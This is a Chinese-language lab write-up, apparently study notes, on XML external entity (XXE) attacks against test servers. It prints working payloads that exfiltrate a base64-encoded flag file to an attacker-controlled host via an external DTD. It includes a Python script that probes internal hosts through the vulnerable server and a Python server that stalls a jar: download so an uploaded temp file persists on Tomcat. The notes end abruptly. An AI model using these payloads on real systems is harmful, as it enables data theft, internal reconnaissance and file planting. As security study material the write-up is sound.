<p>发包后，kali处也接到请求<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623974094378-18f32fa0-a4fe-48a6-a505-56634fc7231e.png#align=left&amp;display=inline&amp;height=56&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.54.44.png&amp;originHeight=146&amp;originWidth=1194&amp;size=98447&amp;status=done&amp;style=none&amp;width=462" alt="截屏2021-06-18 上午7.54.44.png" /><br />与此同时，收到的回复包中，也已经显示出了带有特殊字符内容的flag文件的内容<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623974258932-818b89ba-1a7f-457a-a2c7-9a7844ce4add.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.57.22.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=663742&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-18 上午7.57.22.png" /></p>
<h2 id="xxewu-hui-xian-du-qu-min-gan-wen-jian">XXE无回显读取敏感文件</h2>
<p>无回显的情况下，可以让目标服务器（携带flag）向我们自己的一台服务器发起请求，在请求中携带自己内部的flag<br />首先在我们自己的服务器上存储如下内容的一个文件</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % payload &quot;</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY </span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">25;</span><span> send SYSTEM &#39;http://192.168.43.147/?content=%file;&#39;&gt;&quot;&gt;%payload;
</span></code></pre>
<p>其中 &amp;#x25 是 % 的html编码，作为payload的实体内容，有双引号包裹下，必须用html编码形式，因为实体的值中不能有 %<br />这里使用“实体定义作为另一个实体定义下的实体内容”的形式来实现<br />另外，其中的IP地址 192.168.43.147 即是此文件所在服务器的IP地址</p>
<p>启动我们服务器的监听<br />将发送报文改为如下内容</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /php_xxe/doLogin.php HTTP/1.1
</span><span>Host: 192.168.43.231
</span><span>Content-Length: 286
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.231
</span><span>Referer: http://192.168.43.231/php_xxe/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/flag.txt&quot;&gt;
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % dtd SYSTEM &quot;http://192.168.43.147/evil.xml&quot;&gt;
</span><span>%dtd;
</span><span>%send;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
<p>其参数实体的调用为：首先在报文中调用dtd实体，dtd实体存在于我们的服务器，dtd实体中调用payload实体，而payload实体为 对send实体的定义，这样便从我们的服务器导入了send实体的定义，最后在报文中调用send实体，send实体的内容为 向我们的服务器发起GET请求，请求的内容为file实体，以此将file实体中的文件内容通过GET请求发送到我们的服务器。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095155024-a55f5eb3-e70b-4339-9cee-53836c276bf3.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.32.16.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=1558301&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-19 下午5.32.16.png" /><br />（本图回复包中的报错还没有搞清楚……正常的回复包应该只有包头，不过也可以看到，在回复包的报错中也爆出了请求的内容）<br />可以看到，在发出请求包之后，我们的服务器马上收到了带有GET请求内容的请求包<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095426851-005374ea-5a69-43e5-b1d9-55084f2b36fc.png#align=left&amp;display=inline&amp;height=222&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.36.55.png&amp;originHeight=222&amp;originWidth=1290&amp;size=159149&amp;status=done&amp;style=none&amp;width=1290" alt="截屏2021-06-19 下午5.36.55.png" /><br />最后将收到的内容进行base64解码，即可得到flag值<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095550592-60bb7dba-8cfc-4fb9-96e7-eacb210de7ed.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.38.57.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=346635&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-19 下午5.38.57.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624095585953-f94f217b-3dbf-413b-86a2-68840c5e6af8.png#align=left&amp;display=inline&amp;height=410&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.39.31.png&amp;originHeight=410&amp;originWidth=722&amp;size=75769&amp;status=done&amp;style=none&amp;width=722" alt="截屏2021-06-19 下午5.39.31.png" /></p>
<h2 id="xxetan-ce-nei-wang-duan-kou">XXE探测内网端口</h2>
<p>这里利用XXE作为跳板，向目标主机所在内网发送请求，看是否有回应<br />这里引用笔记最后推荐的一篇好文章的探测内网的部分</p>
<p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
<p><strong>下面是一个探测脚本的实例：</strong></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>requests
</span><span style="color:#b48ead;">import </span><span>base64
</span><span>
</span><span style="color:#65737e;">#Origtional XML that the server accepts
</span><span style="color:#65737e;">#&lt;xml&gt;
</span><span style="color:#65737e;">#    &lt;stuff&gt;user&lt;/stuff&gt;
</span><span style="color:#65737e;">#&lt;/xml&gt;
</span><span>
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">build_xml</span><span>(</span><span style="color:#bf616a;">string</span><span>):
</span><span>    xml = &quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span>&quot;&quot;&quot;
</span><span>    xml = xml + &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot; + &quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span><span>&quot;&quot;&quot;
</span><span>    xml = xml + &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot; + &quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;!ENTITY xxe SYSTEM </span><span>&quot;&quot;&quot; + &#39;</span><span style="color:#a3be8c;">&quot;</span><span>&#39; + string + &#39;</span><span style="color:#a3be8c;">&quot;</span><span>&#39; + &quot;&quot;&quot;</span><span style="color:#a3be8c;">&gt;]&gt;</span><span>&quot;&quot;&quot;
</span><span>    xml = xml + &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot; + &quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;xml&gt;</span><span>&quot;&quot;&quot;
</span><span>    xml = xml + &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot; + &quot;&quot;&quot;    </span><span style="color:#a3be8c;">&lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;</span><span>&quot;&quot;&quot;
</span><span>    xml = xml + &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot; + &quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;/xml&gt;</span><span>&quot;&quot;&quot;
</span><span>    </span><span style="color:#bf616a;">send_xml</span><span>(xml)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_xml</span><span>(</span><span style="color:#bf616a;">xml</span><span>):
</span><span>    headers = {&#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/xml</span><span>&#39;}
</span><span>    x = requests.</span><span style="color:#bf616a;">post</span><span>(&#39;</span><span style="color:#a3be8c;">http://34.200.157.128/CUSTOM/NEW_XEE.php</span><span>&#39;, </span><span style="color:#bf616a;">data</span><span>=xml, </span><span style="color:#bf616a;">headers</span><span>=headers, </span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">5</span><span>).text
</span><span>    coded_string = x.</span><span style="color:#bf616a;">split</span><span>(&#39; &#39;)[-</span><span style="color:#d08770;">2</span><span>] </span><span style="color:#65737e;"># a little split to get only the base64 encoded value
</span><span>    </span><span style="color:#b48ead;">print </span><span>coded_string
</span><span style="color:#65737e;">#   print base64.b64decode(coded_string)
</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">255</span><span>):
</span><span>    </span><span style="color:#b48ead;">try</span><span>:
</span><span>        i = </span><span style="color:#bf616a;">str</span><span>(i)
</span><span>        ip = &#39;</span><span style="color:#a3be8c;">10.0.0.</span><span>&#39; + i
</span><span>        string = &#39;</span><span style="color:#a3be8c;">php://filter/convert.base64-encode/resource=http://</span><span>&#39; + ip + &#39;</span><span style="color:#a3be8c;">/</span><span>&#39;
</span><span>        </span><span style="color:#b48ead;">print </span><span>string
</span><span>        </span><span style="color:#bf616a;">build_xml</span><span>(string)
</span><span>    </span><span style="color:#b48ead;">except</span><span>:
</span><span style="color:#b48ead;">continue
</span></code></pre>
<p><strong>返回结果：</strong><br /><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624120165579-f2e65864-56ba-422c-a6af-4aad3acf262e.png#align=left&amp;display=inline&amp;height=311&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=311&amp;originWidth=902&amp;size=259745&amp;status=done&amp;style=none&amp;width=902" alt="image.png" /></strong><br /><strong><br />找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测<br /></strong><br /><strong>比如我们传入：</strong></p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;  
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">data </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">http://127.0.0.1:515/</span><span>&quot; [  
</span><span>&lt;!</span><span style="color:#b48ead;">ELEMENT </span><span style="color:#bf616a;">data </span><span>(</span><span style="color:#d08770;">#PCDATA</span><span>)&gt;  
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">data</span><span>&gt;4&lt;/</span><span style="color:#bf616a;">data</span><span>&gt;
</span></code></pre>
<p><strong>返回结果：</strong></p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>javax.xml.bind.UnmarshalException  
</span><span> - with linked exception:
</span><span>[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
</span><span>Exception Description: An error occurred unmarshalling the document  
</span><span>Internal Exception: ████████████████████████: Connection refused
</span></code></pre>
<p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p>
<p><strong>如下图所示：</strong><br /><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624120397352-2d1f2223-3687-4ee9-90c6-2d56e3af07d6.png#align=left&amp;display=inline&amp;height=379&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=379&amp;originWidth=884&amp;size=84940&amp;status=done&amp;style=none&amp;width=884" alt="image.png" /></strong><br />至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p>
<h2 id="javaxiang-mu-xxelou-dong-huo-qu-fu-wu-qi-mi-ma">Java项目XXE漏洞获取服务器密码</h2>
<p>不知道为什么，metasploit无法捕获，已经尝试两天了，决定放弃了，以后再看看吧……</p>
<h2 id="javazhong-jarxie-yi-shang-chuan-wen-jian">Java中jar协议上传文件</h2>
<p>通过xxe读取文件目录<br />（tomcat下的XXE.war环境）<br />抓包改包，将发送包改为如下：</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /XXE/doLogin HTTP/1.1
</span><span>Host: 192.168.43.231:8080
</span><span>Content-Length: 167
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.231:8080
</span><span>Referer: http://192.168.43.231:8080/XXE/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY baz SYSTEM &quot;file:///c:/&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">baz;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
<p>即可在回复包中得到c盘的文件目录<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624290735854-36bbf5e6-1885-41f1-b8c1-42354e789e46.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-21%20%E4%B8%8B%E5%8D%8811.51.53.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=608846&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-21 下午11.51.53.png" /><br />若要查看子目录，只要更改目录即可。</p>
<hr />
<p>通过jar协议上传文件（如下实验需要一台远程服务器，这里为kali）<br /><strong>在kali主机内进行如下操作</strong><br />首先需要使用一个python脚本来开启服务，脚本如下：<br /></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>sys 
</span><span style="color:#b48ead;">import </span><span>time 
</span><span style="color:#b48ead;">import </span><span>threading 
</span><span style="color:#b48ead;">import </span><span>socketserver 
</span><span style="color:#b48ead;">from </span><span>urllib.parse </span><span style="color:#b48ead;">import </span><span>quote 
</span><span style="color:#b48ead;">import </span><span>http.client </span><span style="color:#b48ead;">as </span><span>httpc 
</span><span>
</span><span>listen_host = &#39;</span><span style="color:#a3be8c;">192.168.0.110</span><span>&#39; 
</span><span>listen_port = </span><span style="color:#d08770;">9999 
</span><span>jar_file = sys.argv[</span><span style="color:#d08770;">1</span><span>]
</span><span>
</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">JarRequestHandler</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">socketserver.BaseRequestHandler</span><span style="color:#eff1f5;">):  
</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">handle</span><span>(</span><span style="color:#bf616a;">self</span><span>):
</span><span>        http_req = </span><span style="color:#b48ead;">b</span><span>&#39;&#39;
</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">New connection:</span><span>&#39;,</span><span style="color:#bf616a;">self</span><span>.client_address)
</span><span>        </span><span style="color:#b48ead;">while b</span><span>&#39;</span><span style="color:#96b5b4;">\r\n\r\n</span><span>&#39; not in http_req:
</span><span>            </span><span style="color:#b48ead;">try</span><span>:
</span><span>                http_req += </span><span style="color:#bf616a;">self</span><span>.request.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">4096</span><span>)
</span><span>                </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">Client req:</span><span style="color:#96b5b4;">\r\n</span><span>&#39;,http_req.</span><span style="color:#bf616a;">decode</span><span>())
</span><span>                jf = </span><span style="color:#96b5b4;">open</span><span>(jar_file, &#39;</span><span style="color:#a3be8c;">rb</span><span>&#39;)
</span><span>                contents = jf.</span><span style="color:#bf616a;">read</span><span>()
</span><span>                headers = (&#39;&#39;&#39;</span><span style="color:#a3be8c;">HTTP/1.0 200 OK</span><span style="color:#96b5b4;">\r\n</span><span>&#39;&#39;&#39;
</span><span>                &#39;&#39;&#39;</span><span style="color:#a3be8c;">Content-Type: application/java-archive</span><span style="color:#96b5b4;">\r\n\r\n</span><span>&#39;&#39;&#39;)
</span><span>                </span><span style="color:#bf616a;">self</span><span>.request.</span><span style="color:#bf616a;">sendall</span><span>(headers.</span><span style="color:#bf616a;">encode</span><span>(&#39;</span><span style="color:#a3be8c;">ascii</span><span>&#39;))
</span><span>
</span><span>                </span><span style="color:#bf616a;">self</span><span>.request.</span><span style="color:#bf616a;">sendall</span><span>(contents[:-</span><span style="color:#d08770;">1</span><span>])
</span><span>                time.</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">30</span><span>)
</span><span>                </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#d08770;">30</span><span>)
</span><span>                </span><span style="color:#bf616a;">self</span><span>.request.</span><span style="color:#bf616a;">sendall</span><span>(contents[-</span><span style="color:#d08770;">1</span><span>:])
</span><span>
</span><span>            </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
</span><span>                </span><span style="color:#96b5b4;">print </span><span>(&quot;</span><span style="color:#a3be8c;">get error at:</span><span>&quot;+</span><span style="color:#bf616a;">str</span><span>(e))
</span><span>
</span><span>
</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
</span><span>
</span><span>    jarserver = socketserver.</span><span style="color:#bf616a;">TCPServer</span><span>((listen_host,listen_port), JarRequestHandler) 
</span><span>    </span><span style="color:#96b5b4;">print </span><span>(&#39;</span><span style="color:#a3be8c;">waiting for connection...</span><span>&#39; + jar_file) 
</span><span>    server_thread = threading.</span><span style="color:#bf616a;">Thread</span><span>(</span><span style="color:#bf616a;">target</span><span>=jarserver.serve_forever) 
</span><span>    server_thread.daemon = </span><span style="color:#d08770;">True 
</span><span>    server_thread.</span><span style="color:#bf616a;">start</span><span>() 
</span><span>    server_thread.</span><span style="color:#bf616a;">join</span><span>()
</span></code></pre>
<p>脚本先发送文件的除最后一个字符的所有内容，相隔30s再发送最后一个字符。<br />之后准备需要上传的文件，这里以一个xml文本为例<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624293288643-a7ce7a81-aa5d-4151-bcb0-2115d5930e90.png#align=left&amp;display=inline&amp;height=1748&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.34.29.png&amp;originHeight=1748&amp;originWidth=2504&amp;size=1840546&amp;status=done&amp;style=none&amp;width=2504" alt="截屏2021-06-22 上午12.34.29.png" /><br />将这个xml文本打包成zip文件，命名为1.zip<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624293478345-055c7d85-e13d-4997-937b-078881e76878.png#align=left&amp;display=inline&amp;height=218&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.37.44.png&amp;originHeight=426&amp;originWidth=818&amp;size=148918&amp;status=done&amp;style=none&amp;width=418" alt="截屏2021-06-22 上午12.37.44.png" /><br />对这个1.zip进行16进制编辑，在文件的末尾加一些废数据（目的是，上面的python脚本发送的文件不包括最后一个字符，而加上这些废数据后，这些废数据就会被当作最后一个字符舍弃，只读取文件前面正确的数据。）<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624294354644-6ae662db-9e83-4a76-8373-fea95b820e90.png#align=left&amp;display=inline&amp;height=438&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.47.54.png&amp;originHeight=958&amp;originWidth=1314&amp;size=536620&amp;status=done&amp;style=none&amp;width=601" alt="截屏2021-06-22 上午12.47.54.png" /><br />然后在kali主机的1.zip所在目录运行前面所说的python脚本，启动监听<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295235350-e3a78c1f-a0eb-4e93-86cf-bac1f656e54e.png#align=left&amp;display=inline&amp;height=87&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.06.41.png&amp;originHeight=170&amp;originWidth=720&amp;size=54196&amp;status=done&amp;style=none&amp;width=368" alt="截屏2021-06-22 上午1.06.41.png" /><br /><strong>在本机（mac）使用如下操作</strong><br />之后打开burp，抓取发送到目标服务器的包<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624294727991-b45b8651-71f2-4126-8355-7ab41baa88b3.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.58.06.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=482409&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-22 上午12.58.06.png" /><br />改包，将数据包改为如下内容并发送</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /XXE/doLogin HTTP/1.1
</span><span>Host: 192.168.43.231:8080
</span><span>Content-Length: 203
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.231:8080
</span><span>Referer: http://192.168.43.231:8080/XXE/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY baz SYSTEM &quot;jar:http://192.168.43.147:9999/1.zip!/shell.jsp&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">baz;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
<p>可以看到kali处已经收到了请求<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295520460-7e0aa79c-3ddb-40ac-a7b8-6caae2690035.png#align=left&amp;display=inline&amp;height=181&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.10.53.png&amp;originHeight=394&amp;originWidth=986&amp;size=159705&amp;status=done&amp;style=none&amp;width=454" alt="截屏2021-06-22 上午1.10.53.png" /><br />等待30s后（前面python脚本的原因），收到回复包，在回复包中，我们得到了目标服务器的目录<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295669779-36fcaa86-1d0e-49dc-9f68-5bda2a9afefc.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.13.31.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=713365&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-22 上午1.13.31.png" /><br />其中 jar_cache1237144420571861472.tmp 文件即我们所上传的1.zip文件，根据jar的原理，tomcat在收到1.zip后，则将其变成tmp后缀（是的，只是改了下后缀），之后再将tmp文件解压，然后得到里面的内容，然后迅速将tmp文件删除。但这里我们在路径中写了一个不存在的 shell.jsp ,所以tomcat找不到，并且报错（向我们传递了tomcat目录）。并且最重要的是，由于我们的python脚本在文件发送过程中停止了30s，所以此tmp文件在tomcat关闭之前并不会被删除，由此，我们的文件上处成功。</p>
<p>可以看到，在目标服务器中，已经存在我们所上传的tmp文件<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624296212889-d37f76fe-a344-4298-af52-ad211176b059.png#align=left&amp;display=inline&amp;height=1184&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.22.42.png&amp;originHeight=1184&amp;originWidth=1574&amp;size=203616&amp;status=done&amp;style=none&amp;width=1574" alt="截屏2021-06-22 上午1.22.42.png" /></p>
<h2 id="pythonxia-de-xxelou-dong">python下的XXE漏洞</h2>
<p>本实验使用kali linux作为目标服务器，mac作为攻击机<br />kali开启服务<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624297815175-dc4403cd-9a17-4c51-a650-9a0d6b3f51ff.png#align=left&amp;display=inline&amp;height=139&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.48.06.png&amp;originHeight=430&amp;originWidth=1282&amp;size=205493&amp;status=done&amp;style=none&amp;width=414" alt="截屏2021-06-22 上午1.48.06.png" /><br />访问服务器<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624297885799-1b4e3a18-7bec-4488-8a5d-de45ec68f120.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.47.18.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=412582&amp;status=done&amp;style=none&amp;width=2604" alt="截屏2021-06-22 上午1.47.18.png" /><br />burp抓包改包发包，改包为如下</p>
